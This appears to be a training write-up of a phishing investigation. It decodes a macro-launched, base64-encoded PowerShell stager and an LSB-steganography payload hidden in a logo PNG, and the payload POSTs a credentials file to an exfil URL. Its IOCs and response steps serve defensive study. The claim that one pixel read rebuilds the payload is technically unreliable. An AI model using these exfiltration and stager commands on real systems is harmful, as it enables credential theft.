# Part 2: The Bait Gets Sharper

> Stage 2 of the campaign: targeted spearphishing with a weaponized `.docm` attachment, encoded PowerShell, and a steganographically modified PNG.<br>
> The investigation goes beyond the email body — into headers, encoded payloads, and pixel-level steganography.

---

## Email under investigation

```
From: IT Support <it.support@horizondynarnics.com>
To: j.martinez@horizondynamics.com
Subject: Re: Payroll Portal — Action Required: Verify Your Identity
Date: Wed, 9 Apr 2026 07:48:15 -0400

Headers (excerpt):
  Return-Path: <bounce-3291@mail.horizondynarnics.com>
  Received: from mail.horizondynarnics.com (185.234.72.19)
    by mx.horizondynamics.com; Wed, 9 Apr 2026 07:48:12 -0400
  Authentication-Results: mx.horizondynamics.com;
    spf=fail smtp.mailfrom=horizondynarnics.com;
    dkim=none;
    dmarc=fail action=none header.from=horizondynarnics.com

Hi Jordan,

Following up on the payroll migration — we noticed your account
hasn't been verified yet.

To avoid any disruption to your April 15 direct deposit, please
complete the verification by opening the attached document and
following the instructions.

The attached file contains a secure verification form. You'll need
to enable macros to complete the digital signature process.

If you have any questions, contact our help desk at
helpdesk@horizondynamics-support.net

Best,
Horizon Dynamics IT Support Team
```

**Attachments:**
- `Payroll_Verification_Form.docm` — macro-enabled Word document
- `logo.png` — appears to be a normal Horizon Dynamics company logo

---

## Indicators of Compromise

| Type | Value | Notes |
|---|---|---|
| Email | `it.support@horizondynarnics.com` | Sender email address using a typosquatted domain |
| Domain | `horizondynarnics.com` | Typosquatted domain mimicking the legitimate company domain |
| Email | `bounce-3291@mail.horizondynarnics.com` | Return-Path email address using the typosquatted domain |
| Domain | `mail.horizondynarnics.com` | Mail subdomain tied to the typosquatted infrastructure |
| IP | `185.234.72.19` | Source IP of the sending mail server |
| Email | `helpdesk@horizondynamics-support.net` | Support email address using a different external domain |
| Filename | `Payroll_Verification_Form.docm` | Malicious macro-enabled attachment |
| Other | `.docm` | Macro-enabled Microsoft Word document |
| Other | `spf=fail` | SPF validation failed |
| Other | `dkim=none` | No DKIM signature present |
| Other | `dmarc=fail` | DMARC validation failed |
| Command | `powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAg…AHgAIgA=` | Base64-encoded PowerShell command (full string in [`../iocs/iocs.md`](../iocs/iocs.md)) |
| File | `logo.png` | Image used to hide the payload |
| URL | `hxxps://cdn-horizondynamics[.]net/exfil` | Data theft endpoint found in the hidden payload |
| Domain | `cdn-horizondynamics.net` | Malicious data theft domain |
| File path | `%APPDATA%\payroll_creds.txt` | Target file identified in the hidden payload for credential theft |

---

## CyberChef Layer 1: Base64 PowerShell stager

The macro inside `Payroll_Verification_Form.docm` executes:

```
powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQAgACIAJABpAG0AZwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AEYAcgBvAG0ARgBpAGwAZQAoACcAQwA6AFwAVABlAG0AcABcAGwAbwBnAG8ALgBwAG4AZwAnACkAOwAgACQAcAB4ACAAPQAgACQAaQBtAGcALgBHAGUAdABQAGkAeABlAGwAKAAwACwAMAApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABwAHgAIgA=
```

**CyberChef recipe used:**
```
From Base64
  Alphabet: A-Za-z0-9+/=
  Remove non-alphabet chars: ✓
```

**Decoded output (cleartext PowerShell):**

```powershell
powershell -e "$img = [System.Drawing.Bitmap]::FromFile('C:\Temp\logo.png'); $px = $img.GetPixel(0,0); Start-Process $px"
```

**What this does, line by line:**

| Step | Meaning |
|---|---|
| `[System.Drawing.Bitmap]::FromFile('C:\Temp\logo.png')` | Loads `logo.png` as a Bitmap object |
| `$img.GetPixel(0,0)` | Reads pixel data — the entry point into the hidden LSB payload |
| `Start-Process $px` | Executes the reconstructed command extracted from pixels |

> Screenshot reference: [`../evidence/`](../evidence/) — `cyberchef-base64-decode.png`

---

## CyberChef Layer 2: LSB steganography in `logo.png`

The `logo.png` file looks like a normal company logo. Visually identical to a benign image. Run through a steganography decoder, however, the hidden payload appears.

**CyberChef recipe used:**
```
Extract LSB
  Colour Pattern #1: R
  Colour Pattern #2: G
  Colour Pattern #3: B
  Colour Pattern #4: (none / A)
  Pixel Order:       Row
  Bit:               0
```

**Extracted plaintext payload:**

```powershell
Invoke-WebRequest -Uri "hxxps://cdn-horizondynamics.net/exfil" -Method POST -Body (Get-Content "$env:APPDATA\payroll_creds.txt")
```

**What this does:**

1. Reads `%APPDATA%\payroll_creds.txt` from the victim's user profile.
2. POSTs the contents over HTTPS to `cdn-horizondynamics.net/exfil`.
3. HTTPS encryption hides the exfiltrated body from plain-text DPI on the perimeter.

> Screenshot reference: [`../evidence/`](../evidence/) — `cyberchef-lsb-extract.png`

---

## Technical analysis

The attack starts with a phishing email that impersonates IT Support and tells the victim to open the attached `Payroll_Verification_Form.docm` file. The sender uses the typosquatted domain `horizondynarnics.com` while the recipient is on the legitimate `horizondynamics.com` domain, and the message uses urgency and financial pressure by warning about payroll disruption and asking the user to verify the account through an attachment. The header results also show `spf=fail`, `dkim=none`, and `dmarc=fail`, which are strong signs that the sender is not legitimate.

If macros are enabled, the document launches the Base64-encoded PowerShell command `powershell -enc ...`, which loads `C:\Temp\logo.png`, extracts hidden data using `GetPixel(0,0)`, and then runs it with `Start-Process $px`. The macro-enable request is a strong malware delivery indicator. The attacker used social engineering, macro execution, PowerShell scripting, Base64 command obfuscation, and steganography to hide the payload inside `logo.png`. The end goal is credential theft, specifically stealing data from `%APPDATA%\payroll_creds.txt` and sending it to `hxxps://cdn-horizondynamics[.]net/exfil`.

The SOC should immediately block `horizondynarnics.com`, `horizondynamics-support.net`, `cdn-horizondynamics.net`, sender `it.support@horizondynarnics.com`, and IP `185.234.72.19`, then quarantine the email, isolate the affected host, and check whether other users opened the same attachments.

---

## Campaign linkage to Part 1

This email is related to the first one because both use the same payroll topic, the same typosquatted domain `horizondynarnics.com`, and the same urgency and financial pressure tactics to trick employees into acting quickly. The second email uses the same phishing style but progresses from a malicious link to a macro-enabled attachment, which strongly suggests the same campaign and the same threat actor.
